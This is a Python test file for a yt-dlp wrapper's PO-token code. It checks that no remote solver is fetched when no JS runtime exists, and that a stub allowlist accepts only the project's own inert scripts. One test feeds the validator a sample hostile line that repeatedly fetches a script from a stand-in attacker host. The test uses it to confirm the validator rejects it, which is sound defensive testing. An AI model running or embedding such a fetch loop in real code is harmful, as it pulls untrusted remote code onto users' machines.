"""T0-6 honesty tests: the PO-token stub gate vs the real remote JS path.

Diagnosis (see GRABLYTIC_TEARDOWN.md §4 + HQ5): `verify_js_code()` allowlists
two inert stub scripts (both return null), while every `_configure_js_runtime`
branch — INCLUDING the no-runtime fallthrough — enabled
`remote_components=["ejs:github"]`, fetching yt-dlp's EJS challenge solver
(LIB+CORE) from GitHub Releases at runtime. The executed code never passed
through the stub gate.

Fail-closed expectations:
  * no usable JS runtime → NO `remote_components` flag (yt-dlp default-deny;
    setting it without a runtime only triggers a pointless solver fetch).
  * the stub gate keeps doing exactly what it claims (own stubs pass,
    foreign JS raises) — scope documented, not widened by pretense.
"""

import sys

import pytest

from grablytic_engine.po_token import (
    DENO_STUB_SCRIPT,
    QUICKJS_STUB_SCRIPT,
    generate_po_token,
    verify_js_code,
)


@pytest.fixture
def _no_runtime(monkeypatch):
    import shutil
    import grablytic_engine.po_token as pot
    from grablytic_engine.paths import _paths
    monkeypatch.delitem(sys.modules, "java.android", raising=False)
    monkeypatch.setattr(shutil, "which", lambda *a, **k: None)
    monkeypatch.setattr(
        pot, "detect_js_runtime", lambda: {"name": "none", "version": None})
    saved = dict(_paths)
    _paths.update({"deno_path": None, "nodejs_path": None,
                   "po_token": None, "ffmpeg_path": None,
                   "aria2c_path": None})
    try:
        yield
    finally:
        _paths.clear()
        _paths.update(saved)


def test_no_runtime_no_remote_components(_no_runtime):
    from grablytic_engine.opts_builder import build_ydl_opts
    opts = build_ydl_opts()
    assert "js_runtimes" not in opts
    # Fail closed: without a runtime there is nothing that could execute a
    # solver, so the remote fetch must not even be requested.
    assert "remote_components" not in opts


def test_stub_allowlist_accepts_own_stubs():
    verify_js_code(QUICKJS_STUB_SCRIPT)
    verify_js_code(DENO_STUB_SCRIPT)


def test_stub_allowlist_rejects_foreign_js():
    with pytest.raises(ValueError):
        verify_js_code("while(true){fetch('https://evil.test/x.js')}")


def test_remote_solver_decoupled_from_stub_gate(_no_runtime):
    """Locks in the T0-6 diagnosis: stubs solve nothing (token None) — any
    real challenge solving comes from the `ejs:github` remote path, which
    the stub allowlist never inspects (integrity there is yt-dlp's own
    SHA3-512 + version pin in `ejs.py`, not our SHA-256 stub list)."""
    assert generate_po_token("https://www.youtube.com/watch?v=abc123xyz_-") is None
